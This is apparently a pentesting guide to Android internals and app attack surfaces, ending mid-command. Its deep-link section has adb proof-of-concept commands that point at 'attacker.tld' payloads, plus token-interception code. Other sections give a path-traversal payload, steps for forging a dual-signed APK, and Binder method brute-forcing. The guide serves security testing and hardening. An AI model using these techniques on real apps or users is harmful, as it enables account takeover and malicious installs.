  **There are two layers:**\n\n- The **OS**, which keeps installed applications isolated from one another.\n- The **application\
  \ itself**, which allows developers to **expose certain functionalities** and configures application capabilities.\n\n###\
  \ UID Separation\n\n**Each application is assigned a specific User ID**. This is done during the installation of the app\
  \ so t**he app can only interact with files owned by its User ID or shared** files. Therefore, only the app itself, certain\
  \ components of the OS and the root user can access the apps data.\n\n### UID Sharing\n\n**Two applications can be configured\
  \ to use the same UID**. This can be useful to share information, but if one of them is compromised the data of both applications\
  \ will be compromised. This is why this behaviour is **discourage**.\\\n**To share the same UID, applications must define\
  \ the same `android:sharedUserId` value in their manifests.**\n\n### Sandboxing\n\nThe **Android Application Sandbox** allows\
  \ to run **each application** as a **separate process under a separate user ID**. Each process has its own virtual machine,\
  \ so an app’s code runs in isolation from other apps.\\\nFrom Android 5.0(L) **SELinux** is enforced. Basically, SELinux\
  \ denied all process interactions and then created policies to **allow only the expected interactions between them**.\n\n\
  ### Permissions\n\nWhen you installs an **app and it ask for permissions**, the app is asking for the permissions configured\
  \ in the **`uses-permission`** elements in the **AndroidManifest.xml** file. The **uses-permission** element indicates the\
  \ name of the requested permission inside the **name** **attribute.** It also has the **maxSdkVersion** attribute which\
  \ stops asking for permissions on versions higher than the one specified.\\\nNote that android applications don't need to\
  \ ask for all the permissions at the beginning, they can also **ask for permissions dynamically** but all the permissions\
  \ must be **declared** in the **manifest.**\n\nWhen an app exposes functionality it can limit the **access to only apps\
  \ that have a specified permission**.\\\nA permission element has three attributes:\n\n- The **name** of the permission\n\
  - The **permission-group** attribute, which allows for grouping related permissions.\n- The **protection-level** which indicates\
  \ how the permissions are granted. There are four types:\n  - **Normal**: Used when there are **no known threats** to the\
  \ app. The user is **not required to approve i**t.\n  - **Dangerous**: Indicates the permission grants the requesting application\
  \ some **elevated access**. **Users are requested to approve them**.\n  - **Signature**: Only **apps signed by the same\
  \ certificate as the one** exporting the component can be granted permission. This is the strongest type of protection.\n\
  \  - **SignatureOrSystem**: Only **apps signed by the same certificate as the one** exporting the component or **apps running\
  \ with system-level access** can be granted permissions\n\n## Pre-Installed Applications\n\nThese apps are generally found\
  \ in the **`/system/app`** or **`/system/priv-app`** directories and some of them are **optimised** (you may not even find\
  \ the `classes.dex` file). Theses applications are worth checking because some times they are **running with too many permissions**\
  \ (as root).\n\n- The ones shipped with the **AOSP** (Android OpenSource Project) **ROM**\n- Added by the device **manufacturer**\n\
  - Added by the cell **phone provider** (if purchased from them)\n\n## Rooting\n\nIn order to obtain root access into a physical\
  \ android device you generally need to **exploit** 1 or 2 **vulnerabilities** which use to be **specific** for the **device**\
  \ and **version**.\\\nOnce the exploit has worked, usually the Linux `su` binary is copied into a location specified in\
  \ the user's PATH env variable like `/system/xbin`.\n\nOnce the su binary is configured, another Android app is used to\
  \ interface with the `su` binary and **process requests for root access** like **Superuser** and **SuperSU** (available\
  \ in Google Play store).\n\n> [!CAUTION]\n> Note that the rooting process is very dangerous and can damage severely the\
  \ device\n\n### ROMs\n\nIt's possible to **replace the OS installing a custom firmware**. Doing this it's possible to extend\
  \ the usefulness of an old device, bypass software restrictions or gain access to the latest Android code.\\\n**OmniROM**\
  \ and **LineageOS** are two of the most popular firmwares to use.\n\nNote that **not always is necessary to root the device**\
  \ to install a custom firmware. **Some manufacturers allow** the unlocking of their bootloaders in a well-documented and\
  \ safe manner.\n\n### Implications\n\nOnce a device is rooted, any app could request access as root. If a malicious application\
  \ gets it, it can will have access to almost everything and it will be able to damage the phone.\n\n## Android Application\
  \ Fundamentals <a href=\"#2-android-application-fundamentals\" id=\"2-android-application-fundamentals\"></a>\n\n- The format\
  \ of Android applications is referred to as _APK file format_. It is essentially a **ZIP file** (by renaming the file extension\
  \ to .zip, the contents can be extracted and viewed).\n- APK Contents (Not exhaustive)\n  - **AndroidManifest.xml**\n  -\
  \ resources.arsc/strings.xml\n  - resources.arsc: contains precompiled resources, like binary XML.\n    - res/xml/files_paths.xml\n\
  \  - META-INF/\n    - This is where the Certificate is located!\n  - **classes.dex**\n    - Contains Dalvik bytecode, representing\
  \ the compiled Java (or Kotlin) code that the application executes by default.\n  - lib/\n    - Houses native libraries,\
  \ segregated by CPU architecture in subdirectories.\n      - `armeabi`: code for ARM based processors\n      - `armeabi-v7a`:\
  \ code for ARMv7 and higher based processors\n      - `x86`: code for X86 processors\n      - `mips`: code for MIPS processors\
  \ only\n  - assets/\n    - Stores miscellaneous files needed by the app, potentially including additional native libraries\
  \ or DEX files, sometimes used by malware authors to conceal additional code.\n  - res/\n    - Contains resources that are\
  \ not compiled into resources.arsc\n\n### **Dalvik & Smali**\n\nIn Android development, **Java or Kotlin** is used for creating\
  \ apps. Instead of using the JVM like in desktop apps, Android compiles this code into **Dalvik Executable (DEX) bytecode**.\
  \ Earlier, the Dalvik virtual machine handled this bytecode, but now, the Android Runtime (ART) takes over in newer Android\
  \ versions.\n\nFor reverse engineering, **Smali** becomes crucial. It's the human-readable version of DEX bytecode, acting\
  \ like assembly language by translating source code into bytecode instructions. Smali and baksmali refer to the assembly\
  \ and disassembly tools in this context.\n\n## Intents\n\nIntents are the primary means by which Android apps communicate\
  \ between their components or with other apps. These message objects can also carry data between apps or component, similar\
  \ to how GET/POST requests are used in HTTP communications.\n\nSo an Intent is basically a **message that is passed between\
  \ components**. Intents **can be directed** to specific components or apps, **or can be sent without a specific recipient**.\\\
  \nTo be simple Intent can be used:\n\n- To start an Activity, typically opening a user interface for an app\n- As broadcasts\
  \ to inform the system and apps of changes\n- To start, stop, and communicate with a background service\n- To access data\
  \ via ContentProviders\n- As callbacks to handle events\n\nIf vulerable, **Intents can be used to perform a variety of attacks**.\n\
  \n### Intent-Filter\n\n**Intent Filters** define **how an activity, service, or Broadcast Receiver can interact with different\
  \ types of Intents**. Essentially, they describe the capabilities of these components, such as what actions they can perform\
  \ or the kinds of broadcasts they can process. The primary place to declare these filters is within the **AndroidManifest.xml\
  \ file**, though for Broadcast Receivers, coding them is also an option.\n\nIntent Filters are composed of categories, actions,\
  \ and data filters, with the possibility of including additional metadata. This setup allows components to handle specific\
  \ Intents that match the declared criteria.\n\nA critical aspect of Android components (activities/services/content providers/broadcast\
  \ receivers) is their visibility or **public status**. A component is considered public and can interact with other apps\
  \ if it is **`exported`** with a value of **`true`** or if an Intent Filter is declared for it in the manifest. However,\
  \ there's a way for developers to explicitly keep these components private, ensuring they do not interact with other apps\
  \ unintentionally. This is achieved by setting the **`exported`** attribute to **`false`** in their manifest definitions.\n\
  \nMoreover, developers have the option to secure access to these components further by requiring specific permissions. The\
  \ **`permission`** attribute can be set to enforce that only apps with the designated permission can access the component,\
  \ adding an extra layer of security and control over who can interact with it.\n\n```java\n<activity android:name=\".MyActivity\"\
  \ android:exported=\"false\">\n    <!-- Intent filters go here -->\n</activity>\n```\n\n### Implicit Intents\n\nIntents\
  \ are programatically created using an Intent constructor:\n\n```java\nIntent email = new Intent(Intent.ACTION_SEND, Uri.parse(\"\
  mailto:\"));\n```\n\nThe **Action** of the previously declared intent is **ACTION_SEND** and the **Extra** is a mailto **Uri**\
  \ (the Extra if the extra information the intent is expecting).\n\nThis intent should be declared inside the manifest as\
  \ in the following example:\n\n```xml\n<activity android:name=\"ShareActivity\">\n\t<intent-filter>\n       <action android:name=\"\
  android.intent.action.SEND\" />\n       <category android:name=\"android.intent.category.DEFAULT\" />\n    </intent-filter>\n\
  </activity>\n```\n\nAn intent-filter needs to match the **action**, **data** and **category** to receive a message.\n\n\
  The \"Intent resolution\" process determine which app should receive each message. This process considers the **priority\
  \ attribute**, which can be set in the i**ntent-filter declaration**, and t**he one with the higher priority will be selected**.\
  \ This priority can be set between -1000 and 1000 and applications can use the `SYSTEM_HIGH_PRIORITY` value. If a **conflict**\
  \ arises, a \"choser\" Window appears so the **user can decide**.\n\n### Explicit Intents\n\nAn explicit intent specifies\
  \ the class name it's targeting:\n\n```java\nIntent downloadIntent = new (this, DownloadService.class):\n```\n\nIn other\
  \ applications in order to access to the previously declared intent you can use:\n\n```java\nIntent intent = new Intent();\n\
  intent.setClassName(\"com.other.app\", \"com.other.app.ServiceName\");\ncontext.startService(intent);\n```\n\n### Pending\
  \ Intents\n\nThese allow other applications to **take actions on behalf of your application**, using your app's identity\
  \ and permissions. Constructing a Pending Intent it should be **specified an intent and the action to perform**. If the\
  \ **declared intent isn't Explicit** (doesn't declare which intent can call it) a **malicious application could perform\
  \ the declared action** on behalf of the victim app. Moreover, **if an action isn't specified**, the malicious app will\
  \ be able to do **any action on behalf the victim**.\n\n### Broadcast Intents\n\nUnlike the previous intents, which are\
  \ only received by one app, broadcast intents **can be received by multiple apps**. However, from API version 14, it's **possible\
  \ to specify the app that should receive** the message using Intent.set Package.\n\nAlternatively it's also possible to\
  \ **specify a permission when sending the broadcast**. The receiver app will need to have that permission.\n\nThere are\
  \ **two types** of Broadcasts: **Normal** (asynchronous) and **Ordered** (synchronous). The **order** is base on the **configured\
  \ priority within the receiver** element. **Each app can process, relay or drop the Broadcast.**\n\nIt's possible to **send**\
  \ a **broadcast** using the function `sendBroadcast(intent, receiverPermission)` from the `Context` class.\\\nYou could\
  \ also use the function **`sendBroadcast`** from the **`LocalBroadCastManager`** ensures the **message never leaves the\
  \ app**. Using this you won't even need to export a receiver component.\n\n### Sticky Broadcasts\n\nThis kind of Broadcasts\
  \ **can be accessed long after they were sent**.\\\nThese were deprecated in API level 21 and it's recommended to **not\
  \ use them**.\\\n**They allow any application to sniff the data, but also to modify it.**\n\nIf you find functions containing\
  \ the word \"sticky\" like **`sendStickyBroadcast`** or **`sendStickyBroadcastAsUser`**, **check the impact and try to remove\
  \ them**.\n\n## Deep links / URL schemes\n\nIn Android applications, **deep links** are used to initiate an action (Intent)\
  \ directly through a URL. This is done by declaring a specific **URL scheme** within an activity. When an Android device\
  \ tries to **access a URL with this scheme**, the specified activity within the application is launched.\n\nThe scheme must\
  \ be declarated in the **`AndroidManifest.xml`** file:\n\n```xml\n[...]\n<activity android:name=\".MyActivity\">\n  <intent-filter>\n\
  \       <action android:name=\"android.intent.action.VIEW\" />\n       <category android:name=\"android.intent.category.DEFAULT\"\
  \ />\n       <category android:name=\"android.intent.category.BROWSABLE\" />\n       <data android:scheme=\"examplescheme\"\
  \ />\n    </intent-filter>\n[...]\n```\n\nThe scheme from the previous example is `examplescheme://` (note also the **`category\
  \ BROWSABLE`**)\n\nThen, in the data field, you can specify the **host** and **path**:\n\n```xml\n<data android:scheme=\"\
  examplescheme\"\n      android:host=\"example\"\n/>\n```\n\nTo access it from a web it's possible to set a link like:\n\n\
  ```xml\n<a href=\"examplescheme://example/something\">click here</a>\n<a href=\"examplescheme://example/javascript://%250dalert(1)\"\
  >click here</a>\n```\n\nIn order to find the **code that will be executed in the App**, go to the activity called by the\
  \ deeplink and search the function **`onNewIntent`**.\n\nLearn how to [call deep links without using HTML pages](#exploiting-schemes-deep-links).\n\
  \n### Deep link security testing & adb PoCs\n\n- **Entry point discovery**: exported Activities that declare **`<action\
  \ android:name=\"android.intent.action.VIEW\" />` + `<category android:name=\"android.intent.category.BROWSABLE\" />`**\
  \ are remotely reachable via crafted URIs (custom schemes or `http/https` App Links). Prioritise paths containing **login/reset/payment/wallet/admin**\
  \ keywords.\n- **Validation bypass heuristics**: weak host checks such as `endsWith()`, `contains()`, permissive regexes,\
  \ or substring allowlists can usually be bypassed with attacker-controlled subdomains, prefix/suffix tricks, and URL/UTF‑8\
  \ double-encoding.\n- **WebView sinks**: if the handler forwards the incoming URI or query params to `WebView.loadUrl(...)`,\
  \ you can coerce the app to render arbitrary attacker content. If scheme validation is weak, try **`javascript:`** payloads\
  \ as well as external `https://` URLs.\n- **adb PoC templates** (implicit vs explicit):\n\n```bash\n# Generic implicit VIEW\
  \ (custom scheme or App Link)\nadb shell am start -a android.intent.action.VIEW \\\n  -d \"myscheme://com.example.app/web?url=https://attacker.tld/payload.html\"\
  \n\n# Explicitly target a specific Activity\nadb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW\
  \ \\\n  -d \"myapp://host/path?redirect=https://attacker.tld\"\n\n# Try javascript: when scheme filters are lax\nadb shell\
  \ am start -a android.intent.action.VIEW \\\n  -d \"myapp://host/web?url=javascript:alert(1)\"\n```\n\n- **Operational tips**:\
  \ capture multiple payload variants (external URL vs `javascript:`) and replay them quickly against a device/emulator to\
  \ distinguish real issues (open-redirect/auth-bypass/WebView URL injection) from static-analysis noise.\n- **Automation**:\
  \ [Deep-C](https://github.com/KishorBal/deep-C) automates deeplink hunting by decompiling the APK (apktool + dex2jar + jadx),\
  \ enumerating **exported + browsable** activities, correlating weak validation and `WebView.loadUrl` flows, and emitting\
  \ ready-to-run adb PoCs (optionally auto-executed with `--exec`).\n\n### Custom-scheme handler hijacking of onboarding /\
  \ auth tokens\n\nCustom schemes are convenient, but they **do not prove ownership**. If an app ships a sensitive onboarding\
  \ or login flow that places a bearer-like secret inside a URI such as `myapp://bind?code=<token>`, another installed app\
  \ can register the same scheme and receive the full deep link when the victim opens it from a QR scan, browser, or any other\
  \ implicit `VIEW` trigger.\n\nTypical attacker manifest:\n\n```xml\n<activity android:name=\".StealerActivity\" android:exported=\"\
  true\">\n  <intent-filter>\n    <action android:name=\"android.intent.action.VIEW\" />\n    <category android:name=\"android.intent.category.DEFAULT\"\
  \ />\n    <category android:name=\"android.intent.category.BROWSABLE\" />\n    <data android:scheme=\"myapp\" />\n  </intent-filter>\n\
  </activity>\n```\n\nMinimal interception logic:\n\n```java\nIntent intent = getIntent();\nUri data = intent.getData();\n\
  String code = data != null ? data.getQueryParameter(\"code\") : null;\n// Exfiltrate or replay the token\n```\n\nWhy this\
  \ matters:\n- If the deep link transports an **authorization code, bootstrap token, magic-login token, device-binding token,\
  \ password-reset secret, or any other reusable credential**, this becomes an **account takeover / session takeover** primitive\
  \ instead of just a local intent-routing bug.\n- The issue is especially relevant in **QR-driven mobile onboarding** because\
  \ users commonly scan with the camera app and then tap the OS \"open link\" prompt, which triggers an implicit `VIEW` resolution\
  \ outside the trusted app context.\n\nHow to test:\n- Look for authentication-related deep links in manifests, Java/Kotlin,\
  \ and backend responses (`login`, `bind`, `register`, `signin`, `oauth`, `activate`, `reset`, `magic`).\n- Confirm whether\
  \ the flow places secrets in URI **query/path parameters** instead of retrieving them through a trusted app-to-backend exchange.\n\
  - Install a PoC app that claims the same scheme and replay the victim flow from every entry point you can reach: QR scan,\
  \ HTML link, and adb:\n\n```bash\nadb shell am start -a android.intent.action.VIEW \\\n  -d \"myapp://bind?code=test-token\"\
  \n```\n\n- Check whether the attacker app receives the full URI, whether a chooser appears, and whether the intercepted\
  \ token can be replayed remotely to finish login/onboarding.\n\nHardening notes:\n- Prefer **verified `https` App Links**\
  \ over custom schemes for security-sensitive flows.\n- Do not embed reusable secrets in hijackable deep links; bind them\
  \ to the app/backend session and expire them after one use.\n- If a custom scheme is unavoidable, treat every inbound parameter\
  \ as attacker-controlled and avoid using it as a standalone authenticator.\n\n\n## AIDL - Android Interface Definition Language\n\
  \nThe **Android Interface Definition Language (AIDL)** is designed for facilitating communication between client and service\
  \ in Android applications through **interprocess communication** (IPC). Since accessing another process's memory directly\
  \ is not permitted on Android, AIDL simplifies the process by marshalling objects into a format understood by the operating\
  \ system, thereby easing communication across different processes.\n\n### Key Concepts\n\n- **Bound Services**: These services\
  \ utilize AIDL for IPC, enabling activities or components to bind to a service, make requests, and receive responses. The\
  \ `onBind` method in the service's class is critical for initiating interaction, marking it as a vital area for security\
  \ review in search of vulnerabilities.\n\n- **Messenger**: Operating as a bound service, Messenger facilitates IPC with\
  \ a focus on processing data through the `onBind` method. It's essential to inspect this method closely for any unsafe data\
  \ handling or execution of sensitive functions.\n\n- **Binder**: Although direct usage of the Binder class is less common\
  \ due to AIDL's abstraction, it's beneficial to understand that Binder acts as a kernel-level driver facilitating data transfer\
  \ between the memory spaces of different processes. For further understanding, a resource is available at [https://www.youtube.com/watch?v=O-UHvFjxwZ8](https://www.youtube.com/watch?v=O-UHvFjxwZ8).\n\
  \n## Components\n\nThese include: **Activities, Services, Broadcast Receivers and Providers.**\n\n### Launcher Activity\
  \ and other activities\n\nIn Android apps, **activities** are like screens, showing different parts of the app's user interface.\
  \ An app can have many activities, each one presenting a unique screen to the user.\n\nThe **launcher activity** is the\
  \ main gateway to an app, launched when you tap the app's icon. It's defined in the app's manifest file with specific MAIN\
  \ and LAUNCHER intents:\n\n```html\n<activity android:name=\".LauncherActivity\">\n    <intent-filter>\n        <action\
  \ android:name=\"android.intent.action.MAIN\" />\n        <category android:name=\"android.intent.category.LAUNCHER\" />\n\
  \    </intent-filter>\n</activity>\n```\n\nNot all apps need a launcher activity, especially those without a user interface,\
  \ like background services.\n\nActivities can be made available to other apps or processes by marking them as \"exported\"\
  \ in the manifest. This setting allows other apps to start this activity:\n\n```markdown\n<service android:name=\".ExampleExportedService\"\
  \ android:exported=\"true\"/>\n```\n\nHowever, accessing an activity from another app isn't always a security risk. The\
  \ concern arises if sensitive data is being shared improperly, which could lead to information leaks.\n\nAn activity's lifecycle\
  \ **begins with the onCreate method**, setting up the UI and preparing the activity for interaction with the user.\n\n###\
  \ Application Subclass\n\nIn Android development, an app has the option to create a **subclass** of the [Application](https://developer.android.com/reference/android/app/Application)\
  \ class, though it's not mandatory. When such a subclass is defined, it becomes the first class to be instantiated within\
  \ the app. The **`attachBaseContext`** method, if implemented in this subclass, is executed before the **`onCreate`** method.\
  \ This setup allows for early initialization before the rest of the application starts.\n\n```java\npublic class MyApp extends\
  \ Application {\n    @Override\n    protected void attachBaseContext(Context base) {\n        super.attachBaseContext(base);\n\
  \        // Initialization code here\n    }\n\n    @Override\n    public void onCreate() {\n        super.onCreate();\n\
  \        // More initialization code\n    }\n}\n```\n\n### Services\n\n[Services](https://developer.android.com/guide/components/services)\
  \ are **background operatives** capable of executing tasks without a user interface. These tasks can continue running even\
  \ when users switch to different applications, making services crucial for **long-running operations**.\n\nServices are\
  \ versatile; they can be initiated in various ways, with **Intents** being the primary method for launching them as an application's\
  \ entry point. Once a service is started using the `startService` method, its `onStart` method kicks into action and keeps\
  \ running until the `stopService` method is explicitly called. Alternatively, if a service's role is contingent on an active\
  \ client connection, the `bindService` method is used for binding the client to the service, engaging the `onBind` method\
  \ for data passage.\n\nAn interesting application of services includes background music playback or network data fetching\
  \ without hindering the user's interaction with an app. Moreover, services can be made accessible to other processes on\
  \ the same device through **exporting**. This is not the default behavior and requires explicit configuration in the Android\
  \ Manifest file:\n\n```xml\n<service android:name=\".ExampleExportedService\" android:exported=\"true\"/>\n```\n\n### Broadcast\
  \ Receivers\n\n**Broadcast receivers** act as listeners in a messaging system, allowing multiple applications to respond\
  \ to the same messages from the system. An app can **register a receiver** in **two primary ways**: through the app's **Manifest**\
  \ or **dynamically** within the app's code via the **`registerReceiver`** API. In the Manifest, broadcasts are filtered\
  \ with permissions, while dynamically registered receivers can also specify permissions upon registration.\n\n**Intent filters**\
  \ are crucial in both registration methods, determining which broadcasts trigger the receiver. Once a matching broadcast\
  \ is sent, the receiver's **`onReceive`** method is invoked, enabling the app to react accordingly, such as adjusting behavior\
  \ in response to a low battery alert.\n\nBroadcasts can be either **asynchronous**, reaching all receivers without order,\
  \ or **synchronous**, where receivers get the broadcast based on set priorities. However, it's important to note the potential\
  \ security risk, as any app can prioritize itself to intercept a broadcast.\n\nTo understand a receiver's functionality,\
  \ look for the **`onReceive`** method within its class. This method's code can manipulate the received Intent, highlighting\
  \ the need for data validation by receivers, especially in **Ordered Broadcasts**, which can modify or drop the Intent.\n\
  \n#### Weak receiver challenge-response and crash-to-restart primitives\n\nSome OEM apps try to protect an exported receiver\
  \ with a broadcasted challenge-response, but the challenge is generated from a **static `Random`** seeded once at process\
  \ start (`new Random(System.currentTimeMillis())`). If you can force a restart or approximate the launch time, the receiver\
  \ secret becomes brute-forceable within a very small seed window.\n\nWhat to look for:\n- exported receivers/services expecting\
  \ a `VERIFY_*` / `AUTH_*` value back through another broadcast\n- static or global `Random` instances seeded from wall-clock\
  \ time\n- 30-60 second verification windows\n- other exported components that crash on `intent.getData()`, missing extras,\
  \ or bad casts, giving you a **restart primitive**\n\nIn exploit chains, a null-deref or similar DoS in another exported\
  \ component can reset the process and make the receiver-side RNG state predictable.\n\n### Content Provider\n\n**Content\
  \ Providers** are essential for **sharing structured data** between apps, emphasizing the importance of implementing **permissions**\
  \ to ensure data security. They allow apps to access data from various sources, including databases, filesystems, or the\
  \ web. Specific permissions, like **`readPermission`** and **`writePermission`**, are crucial for controlling access. Additionally,\
  \ temporary access can be granted through **`grantUriPermission`** settings in the app's manifest, leveraging attributes\
  \ such as `path`, `pathPrefix`, and `pathPattern` for detailed access control.\n\nInput validation is paramount to prevent\
  \ vulnerabilities, such as SQL injection. Content Providers support basic operations: `insert()`, `update()`, `delete()`,\
  \ and `query()`, facilitating data manipulation and sharing among applications.\n\n#### DocumentProvider restore/import\
  \ path traversal\n\nWhen an exported receiver or service accepts **`DocumentProvider` / tree URIs** and then copies them\
  \ into a local folder, the bug may live in the **consumer** rather than in the provider. A common anti-pattern is deriving\
  \ the destination path from `DocumentsContract.getDocumentId(srcUri)` with string operations and passing the result directly\
  \ into `new File(...)`.\n\n```java\nFile dstFile = new File(\n    DocumentsContract.getDocumentId(srcUri)\n        .replaceFirst(rootDocumentId,\
  \ tempFolderPath) // no canonicalization\n);\ntry (InputStream in = resolver.openInputStream(srcUri);\n     OutputStream\
  \ out = new FileOutputStream(dstFile)) {\n    // copy attacker-controlled bytes\n}\n```\n\nIf the attacker controls the\
  \ provider, encoded traversal such as `data%2F..%2Fpayload.apk` becomes `data/../payload.apk` after decoding and can escape\
  \ the intended directory. This yields an **arbitrary file write inside the victim app sandbox**, often enough to overwrite\
  \ cached plugins, downloaded APKs, or restore targets.\n\nAudit checklist:\n- restore/import/migration actions receiving\
  \ arrays of URIs (`SAVE_URI_PATHS`, `EXTRA_STREAM`, `ClipData`)\n- calls to `DocumentsContract.getDocumentId`, `Uri.getPath`,\
  \ `mkdirs`, `openInputStream`, `FileOutputStream`\n- missing `getCanonicalPath()` + `startsWith(<allowed_dir>)` validation\
  \ on the final destination\n\n### Permission semantics and pitfalls (Content Providers)\n\n- If a provider is exported,\
  \ you should declare both readPermission and writePermission explicitly. When writePermission is omitted the default is\
  \ null, meaning any app can attempt insert/update/delete if those methods are implemented by the provider.\n- Never concatenate\
  \ untrusted projection, selection, selectionArgs, or sortOrder into raw SQL. Use whitelists and parameter binding (e.g.,\
  \ SQLiteQueryBuilder with a projection map) and fixed WHERE templates.\n- Prefer android:exported=\"false\" unless the provider\
  \ must be public. For selective sharing, use grantUriPermissions with path/pathPrefix/pathPattern.\n\n**FileProvider**,\
  \ a specialized Content Provider, focuses on sharing files securely. It is defined in the app's manifest with specific attributes\
  \ to control access to folders, denoted by `android:exported` and `android:resource` pointing to folder configurations.\
  \ Caution is advised when sharing directories to avoid exposing sensitive data inadvertently.\n\nExample manifest declaration\
  \ for FileProvider:\n\n```xml\n<provider android:name=\"androidx.core.content.FileProvider\"\n          android:authorities=\"\
  com.example.myapp.fileprovider\"\n          android:grantUriPermissions=\"true\"\n          android:exported=\"false\">\n\
  \    <meta-data android:name=\"android.support.FILE_PROVIDER_PATHS\"\n               android:resource=\"@xml/filepaths\"\
  \ />\n</provider>\n```\n\nAnd an example of specifying shared folders in `filepaths.xml`:\n\n```xml\n<paths>\n    <files-path\
  \ path=\"images/\" name=\"myimages\" />\n</paths>\n```\n\nFor further information check:\n\n- [Android Developers: Content\
  \ Providers](https://developer.android.com/guide/topics/providers/content-providers)\n- [Android Developers: FileProvider](https://developer.android.com/training/secure-file-sharing/setup-sharing)\n\
  \n## WebViews\n\nWebViews are like **mini web browsers** inside Android apps, pulling content either from the web or from\
  \ local files. They face similar risks as regular browsers, yet there are ways to **reduce these risks** through specific\
  \ **settings**.\n\nAndroid offers two main WebView types:\n\n- **WebViewClient** is great for basic HTML but doesn't support\
  \ the JavaScript alert function, affecting how XSS attacks can be tested.\n- **WebChromeClient** acts more like the full\
  \ Chrome browser experience.\n\nA key point is that WebView browsers do **not share cookies** with the device's main browser.\n\
  \nFor loading content, methods such as `loadUrl`, `loadData`, and `loadDataWithBaseURL` are available. It's crucial to ensure\
  \ these URLs or files are **safe to use**. Security settings can be managed via the `WebSettings` class. For instance, disabling\
  \ JavaScript with `setJavaScriptEnabled(false)` can prevent XSS attacks.\n\nThe JavaScript \"Bridge\" lets Java objects\
  \ interact with JavaScript, requiring methods to be marked with `@JavascriptInterface` for security from Android 4.2 onwards.\n\
  \nAllowing content access (`setAllowContentAccess(true)`) lets WebViews reach Content Providers, which could be a risk unless\
  \ the content URLs are verified as secure.\n\nTo control file access:\n\n- Disabling file access (`setAllowFileAccess(false)`)\
  \ limits access to the filesystem, with exceptions for certain assets, ensuring they're only used for non-sensitive content.\n\
  \n## Other App Components and Mobile Device Management\n\n### **Digital Signing of Applications**\n\n- **Digital signing**\
  \ is a must for Android apps, ensuring they're **authentically authored** before installation. This process uses a certificate\
  \ for app identification and must be verified by the device's package manager upon installation. Apps can be **self-signed\
  \ or certified by an external CA**, safeguarding against unauthorized access and ensuring the app remains untampered during\
  \ its delivery to the device.\n\n#### Deterministic installer cache / artifact substitution\n\nIf a store, updater, or helper\
  \ component downloads an installable artifact to a **deterministic path**, check how it decides the file is \"already downloaded\"\
  . A dangerous pattern is a cache hit based only on **existence + size** (for example `file.length() >= expectedSize`) before\
  \ a later install stage.\n\nIf you can write attacker-controlled bytes to that exact path, the install flow may reuse the\
  \ substituted artifact on the next deep link / broadcast / API trigger. This becomes especially useful when the app auto-installs\
  \ helper APKs, plugins, or \"shell\" launchers without user confirmation.\n\n#### Custom APK verifier confusion / mixed-scheme\
  \ abuse\n\nSome stores and updaters perform their own APK signature verification before handing the file to Android's Package\
  \ Installer. Audit whether that logic matches the platform rules.\n\nRed flags:\n- a present **v3** signing block fails\
  \ signer validation but the custom verifier **falls back to v2** instead of rejecting\n- v2 verification checks only the\
  \ signature over the embedded digest, but **does not recompute the digest from the APK contents**\n- package-name or metadata\
  \ checks exist, but signer validation is not bound to the actual file body\n\nThis can enable a **dual-signed APK**:\n1.\
  \ Build the payload with the expected package name.\n2. Sign it with an attacker-controlled **v3** signature only.\n3. Transplant\
  \ a trusted APK's **v2** signing block into the payload.\n4. The custom verifier accepts the trusted v2 block, while Android\
  \ installs the same APK using the valid attacker v3 block.\n\n```bash\napksigner sign \\\n  --ks key.jks \\\n  --out payload-v3.apk\
  \ \\\n  --v1-signing-enabled false \\\n  --v2-signing-enabled false \\\n  --v3-signing-enabled true \\\n  payload.apk\n\n\
  apksigner verify --verbose --print-certs payload-v3.apk\n```\n\nThis pattern is relevant in OEM app stores, plugin managers,\
  \ enterprise installers, or any code path that tries to enforce a custom signer allowlist outside the normal Android verifier.\n\
  \n### **App Verification for Enhanced Security**\n\n- Starting from **Android 4.2**, a feature called **Verify Apps** allows\
  \ users to have apps checked for safety before installation. This **verification process** can warn users against potentially\
  \ harmful apps, or even prevent the installation of particularly malicious ones, enhancing user security.\n\n### **Mobile\
  \ Device Management (MDM)**\n\n- **MDM solutions** provide **oversight and security** for mobile devices through **Device\
  \ Administration API**. They necessitate the installation of an Android app to manage and secure mobile devices effectively.\
  \ Key functions include **enforcing password policies**, **mandating storage encryption**, and **permitting remote data\
  \ wipe**, ensuring comprehensive control and security over mobile devices.\n\n```java\n// Example of enforcing a password\
  \ policy with MDM\nDevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);\nComponentName\
  \ adminComponent = new ComponentName(context, AdminReceiver.class);\n\nif (dpm.isAdminActive(adminComponent)) {\n    //\
  \ Set minimum password length\n    dpm.setPasswordMinimumLength(adminComponent, 8);\n}\n```\n\n\n## Enumerating and Exploiting\
  \ AIDL / Binder Services\n\nAndroid *Binder* IPC exposes many **system and vendor-provided services**. Those services become\
  \ an **attack surface** when they are exported without a proper permission check (the AIDL layer itself performs *no* access-control).\n\
  \n### 1. Discover running services\n\n```bash\n# from an adb shell (USB or wireless)\nservice list               # simple\
  \ one-liner\nam list services           # identical output, ActivityManager wrapper\n```\n\nOutput is a numbered list such\
  \ as:\n```\n145  mtkconnmetrics: [com.mediatek.net.connectivity.IMtkIpConnectivityMetrics]\n146  wifi             : [android.net.wifi.IWifiManager]\n\
  ```\n* The **index** (first column) is assigned at runtime – do ***not*** rely on it across reboots.\n* The **Binder name**\
  \ (e.g. `mtkconnmetrics`) is what will be passed to `service call`.\n* The value inside the brackets is the fully-qualified\
  \ **AIDL interface** that the stub was generated from.\n\n### 2. Obtain the interface descriptor (PING)\nEvery Binder stub\
  \ automatically implements **transaction code `0x5f4e5446`** (`1598968902` decimal, ASCII \"_NTF\").\n\n```bash\n# \"ping\"\
  \ the service\nservice call mtkconnmetrics 1    # 1 == decimal 1598968902 mod 2^32\n```\nA valid reply returns the interface\
  \ name encoded as a UTF-16 string inside a `Parcel`.\n\n### 3. Calling a transaction\nSyntax: `service call <name> <code>\
  \ [type value ...]`\n\nCommon argument specifiers:\n* `i32 <int>` – signed 32-bit value\n* `i64 <long>` – signed 64-bit\
  \  value\n* `s16 <string>` – UTF-16 string (Android 13+ uses `utf16`)\n\nExample – start network monitoring with uid **1**\
  \ on a MediaTek handset:\n```bash\nservice call mtkconnmetrics 8 i32 1\n```\n\n### 4. Brute-forcing unknown methods\nWhen\
  \ header files are unavailable you can **iterate the code** until the error changes from:\n```\nResult: Parcel(00000000\
  \ 00000000)  # \"Not a data message\"\n```\nto a normal `Parcel` response or `SecurityException`.\n\n```bash\nfor i in $(seq\
